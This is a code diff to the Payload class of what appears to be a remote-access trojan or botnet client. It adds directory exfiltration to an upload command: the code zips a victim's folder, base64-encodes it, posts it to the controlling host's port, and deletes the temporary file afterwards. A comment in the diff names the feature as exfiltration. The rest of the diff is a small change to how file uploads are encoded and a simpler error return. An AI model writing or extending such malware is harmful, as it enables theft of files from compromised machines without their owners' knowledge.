@@ -21,6 +21,8 @@ import subprocess
 import collections
 import logging.handlers
 import traceback
+import zipfile
+import pathlib
 
 
 if sys.version_info[0] < 3:
@@ -656,15 +658,33 @@ class Payload():
                 _, filetype = os.path.splitext(filename)
                 with open(filename, 'rb') as fp:
                     data = base64.b64encode(fp.read())
-                json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+                # decode bytes into a utf-8 encoded string
+                datastr = data.decode('utf-8')
+                json_data = {'data': datastr, 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                return "Upload complete"
+            elif os.path.isdir(filename):
+                host, port = self.connection.getpeername()
+                folder = pathlib.Path(filename)
+                # Exfiltration of dir done with temp zip file on memory
+                zip_path = './temp.zip'
+                with zipfile.ZipFile(zip_path, 'w') as zip:
+                    for file in folder.iterdir():
+                        zip.write(file)
+                zip.close()
+                with open("temp.zip", 'rb') as fp:
+                    data = base64.b64encode(fp.read())
+                # decode bytes into a utf-8 encoded string
+                datastr = data.decode('utf-8')
+                json_data = {'data': datastr, 'filename': filename, 'type': ".zip", 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                os.remove("temp.zip")
                 return "Upload complete"
             else:
                 return "Error: file not found"
         except Exception as e:
             log("{} error: {}".format(self.upload.__name__, str(e)))
-            return traceback.format_exc()
-            # return "Error: {}".format(str(e))
+            return "Error: {}".format(str(e))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='webcam <mode> [options]')
